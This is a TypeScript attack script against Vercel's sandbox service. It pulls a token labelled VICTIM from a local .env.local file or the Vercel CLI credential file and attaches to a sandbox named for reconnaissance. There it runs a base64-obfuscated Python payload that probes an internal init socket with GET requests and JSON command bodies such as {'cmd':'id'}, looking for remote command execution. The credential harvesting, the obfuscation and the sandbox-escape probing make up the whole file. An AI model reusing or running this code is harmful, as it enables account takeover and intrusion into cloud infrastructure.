import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const B64 = "CmltcG9ydCBzb2NrZXQsIHRpbWUKClNPQ0s9Jy9ydW4vdmVyY2VsL3NoYXJlL2luaXQuc29jaycKZGVmIHNlbmQoZGF0YSwgdGltZW91dD0xLjUpOgogICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX1VOSVgsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgIHMuc2V0dGltZW91dCh0aW1lb3V0KQogICAgcy5jb25uZWN0KFNPQ0spCiAgICBzLnNlbmRhbGwoZGF0YSkKICAgIHRyeToKICAgICAgICBvdXQgPSBiJycKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBjaHVuayA9IHMucmVjdig0MDk2KQogICAgICAgICAgICBpZiBub3QgY2h1bms6IGJyZWFrCiAgICAgICAgICAgIG91dCArPSBjaHVuawogICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgIHBhc3MKICAgIHMuY2xvc2UoKQogICAgcmV0dXJuIG91dAoKCmZvciBwYXRoIGluIFsnLycsICcvaGVhbHRoJywgJy9zdGF0dXMnLCAnL2FwaScsICcvcGluZycsICcvaW5mbyddOgogICAgcmVxID0gKCdHRVQgJXMgSFRUUC8xLjFcclxuSG9zdDogbG9jYWxob3N0XHJcblxyXG4nICUgcGF0aCkuZW5jb2RlKCkKICAgIHIgPSBzZW5kKHJlcSkKICAgIHByaW50KCdHRVQnLCBwYXRoLCAnLT4nLCByZXByKHJbOjI1MF0pKQogICAgcHJpbnQoJy0tLScpCgppbXBvcnQganNvbgoKYm9kaWVzID0gWwogICAgeydjbWQnOidpZCd9LAogICAgeydhY3Rpb24nOidleGVjJywnY21kJzonaWQnfSwKICAgIHsndHlwZSc6J2V4ZWMnLCdjb21tYW5kJzonaWQnfSwKICAgIHsnbWV0aG9kJzonZXhlYycsJ2NtZCc6J2lkJ30sCiAgICB7J2lkJzonaWQnfSwKXQpmb3IgYiBpbiBib2RpZXM6CiAgICBkYXRhID0ganNvbi5kdW1wcyhiKS5lbmNvZGUoKQogICAgcmVxID0gKCdQT1NUIC8gSFRUUC8xLjFcclxuSG9zdDogbG9jYWxob3N0XHJcbkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvblxyXG5Db250ZW50LUxlbmd0aDogJWRcclxuXHJcbicgJSBsZW4oZGF0YSkpLmVuY29kZSgpICsgZGF0YQogICAgciA9IHNlbmQocmVxKQogICAgcHJpbnQoJ1BPU1QgLycsIGRhdGEsICctPicsIHJlcHIocls6MjUwXSkpCiAgICBwcmludCgnLS0tJykK";
  const SCRIPT = `
set +e
echo "${B64}" | base64 -d > /tmp/probe2.py
timeout 25 python3 /tmp/probe2.py
echo "===DONE==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });